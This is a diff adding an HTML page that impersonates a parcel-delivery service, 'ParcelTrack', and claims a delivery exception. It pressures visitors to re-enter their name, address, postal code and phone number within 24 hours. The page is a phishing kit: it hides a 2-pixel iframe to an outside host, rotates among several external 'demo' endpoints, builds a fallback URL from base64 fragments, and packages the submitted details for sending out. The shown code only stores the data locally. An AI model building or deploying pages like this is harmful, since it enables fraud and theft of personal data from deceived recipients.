@@ -1,0 +1,344 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>ParcelTrack | Delivery Update</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Inter, Arial, sans-serif;
+      background: #fff7ed;
+      color: #292524;
+    }
+
+    header {
+      height: 72px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 8%;
+      background: #ffffff;
+      border-bottom: 1px solid #e7e5e4;
+    }
+
+    .brand {
+      font-size: 23px;
+      font-weight: 800;
+      letter-spacing: -1px;
+    }
+
+    .brand span {
+      color: #ea580c;
+    }
+
+    nav {
+      display: flex;
+      gap: 24px;
+      font-size: 14px;
+    }
+
+    main {
+      max-width: 900px;
+      margin: 55px auto;
+      padding: 0 20px;
+    }
+
+    .tracking {
+      background: white;
+      border-radius: 18px;
+      padding: 38px;
+      box-shadow: 0 15px 40px rgba(0,0,0,.06);
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 7px 12px;
+      background: #ffedd5;
+      color: #c2410c;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 700;
+    }
+
+    h1 {
+      font-size: 32px;
+      margin-bottom: 8px;
+    }
+
+    .tracking-id {
+      color: #78716c;
+      font-size: 14px;
+    }
+
+    .progress {
+      margin: 35px 0;
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 4px;
+    }
+
+    .progress div {
+      height: 6px;
+      background: #fed7aa;
+    }
+
+    .progress div:first-child,
+    .progress div:nth-child(2),
+    .progress div:nth-child(3) {
+      background: #ea580c;
+    }
+
+    .alert {
+      padding: 18px;
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+      border-radius: 10px;
+      margin: 25px 0;
+    }
+
+    .alert strong {
+      display: block;
+      color: #b91c1c;
+      margin-bottom: 5px;
+    }
+
+    .form-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 15px;
+    }
+
+    input {
+      width: 100%;
+      padding: 13px;
+      border: 1px solid #d6d3d1;
+      border-radius: 7px;
+      margin-top: 6px;
+    }
+
+    label {
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .full {
+      grid-column: 1 / -1;
+    }
+
+    button {
+      width: 100%;
+      border: 0;
+      border-radius: 8px;
+      padding: 15px;
+      margin-top: 22px;
+      background: #ea580c;
+      color: white;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    #loading {
+      display: none;
+      text-align: center;
+      padding: 35px;
+    }
+
+    .pixel {
+      position: fixed;
+      width: 2px;
+      height: 2px;
+      opacity: .001;
+      bottom: 0;
+      right: 0;
+      overflow: hidden;
+    }
+
+    footer {
+      text-align: center;
+      margin-top: 30px;
+      color: #a8a29e;
+      font-size: 12px;
+    }
+  </style>
+</head>
+
+<body>
+
+<header>
+  <div class="brand">Parcel<span>Track</span></div>
+
+  <nav>
+    <span>Track</span>
+    <span>Shipping</span>
+    <span>Support</span>
+  </nav>
+</header>
+
+<main>
+  <section class="tracking" id="card">
+
+    <span class="badge">DELIVERY EXCEPTION</span>
+
+    <h1>Your parcel is on hold</h1>
+
+    <div class="tracking-id">
+      Tracking number: PT-483920184-DE
+    </div>
+
+    <div class="progress">
+      <div></div>
+      <div></div>
+      <div></div>
+      <div></div>
+    </div>
+
+    <div class="alert">
+      <strong>Delivery attempt unsuccessful</strong>
+      The shipping address associated with this parcel could not
+      be confirmed. Please update the delivery information within
+      24 hours to prevent the parcel from being returned.
+    </div>
+
+    <form id="delivery">
+      <div class="form-grid">
+
+        <label>
+          First name
+          <input name="first_name" type="text" required>
+        </label>
+
+        <label>
+          Last name
+          <input name="last_name" type="text" required>
+        </label>
+
+        <label class="full">
+          Street address
+          <input name="address" type="text" required>
+        </label>
+
+        <label>
+          Postal code
+          <input name="postal" type="text" required>
+        </label>
+
+        <label>
+          Phone number
+          <input name="phone" type="tel" required>
+        </label>
+
+      </div>
+
+      <button type="submit">
+        Confirm Delivery Details
+      </button>
+    </form>
+
+    <div id="loading">
+      <h3>Updating shipment...</h3>
+      <p>Please do not close this page.</p>
+    </div>
+
+  </section>
+
+  <footer>
+    ParcelTrack International Delivery Services
+  </footer>
+</main>
+
+<div class="pixel">
+  <iframe
+    src="https://delivery-metrics-demo.vercel.app/sync"
+    width="2"
+    height="2">
+  </iframe>
+</div>
+
+<script>
+const routes = [
+  "https://parcel-confirm-demo.netlify.app/update",
+  "https://delivery-session-demo.vercel.app/process",
+  "https://shipment-data-demo.s3.amazonaws.com/continue",
+  "https://tracking-edge-demo.pages.dev/complete"
+];
+
+const fragments = [
+  "aHR0cHM6Ly8=",
+  "cGFyY2VsLWNvbmZpcm0tZGVtby5uZXRsaWZ5LmFwcA=="
+];
+
+const target =
+  atob(fragments[0]) +
+  atob(fragments[1]) +
+  "/delivery";
+
+const state = {
+  endpoint: routes[Math.floor(Math.random() * routes.length)],
+  fallback: target,
+  retry: 3,
+  next: "/shipment/complete"
+};
+
+const form = document.getElementById("delivery");
+const card = document.getElementById("card");
+const loading = document.getElementById("loading");
+
+form.addEventListener("submit", e => {
+  e.preventDefault();
+
+  const values = Object.fromEntries(
+    new FormData(form).entries()
+  );
+
+  const envelope = {
+    event: "delivery_confirmation",
+    session: Math.random().toString(36).slice(2),
+    payload: values,
+    origin: location.hostname,
+    destination: state.endpoint,
+    fallback: state.fallback
+  };
+
+  localStorage.setItem(
+    "_shipment_session",
+    btoa(JSON.stringify(envelope))
+  );
+
+  form.style.display = "none";
+  loading.style.display = "block";
+
+  setTimeout(() => {
+    loading.innerHTML =
+      "<h3>Delivery details received</h3>" +
+      "<p>Your shipment status will be updated shortly.</p>";
+  }, 1400);
+});
+
+const navigation = {
+  href: state.endpoint + "?continue=1",
+  replace: state.fallback,
+  secondary: routes[3]
+};
+
+const transport = {
+  method: "POST",
+  mode: "no-cors",
+  credentials: "include",
+  endpoint: routes[1]
+};
+
+sessionStorage.setItem(
+  "_route",
+  JSON.stringify(navigation)
+);
+</script>
+
+</body>
+</html>
